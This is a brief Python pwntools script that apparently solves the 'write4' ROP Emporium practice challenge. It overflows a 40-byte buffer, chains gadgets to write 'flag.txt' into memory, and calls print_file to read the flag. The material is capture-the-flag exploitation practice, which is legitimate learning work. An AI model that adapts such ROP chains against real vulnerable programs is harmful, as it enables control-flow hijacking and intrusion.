from pwn import *

binary = ELF('./write4')

p = binary.process()

offset = 40

pop_r14_r15 = 0x0000000000400690 # pop r14; pop r15; ret;
gadget_mov = 0x00400628 # mov qword ptr [r14], r15; ret;
gadget_pop_rdi = 0x0000000000400693 # pop rdi; ret;
print_file = 0x0000000000400510 # usefulFunction

payload = b'A' * offset 
payload += p64(pop_r14_r15) # pop r14; pop r15; ret;

payload += p64(0x0000000000601038) # address to write to
payload += b"flag.txt" # data to write
payload+=  p64(gadget_mov)

payload+= p64(gadget_pop_rdi) # pop rdi; ret;
payload += p64(0x0000000000601038) # address to write to rdi
payload += p64(print_file) # address of the function to call

p.sendline(payload)

with open("payload", "wb") as f:
    f.write(payload)
 
p.interactive()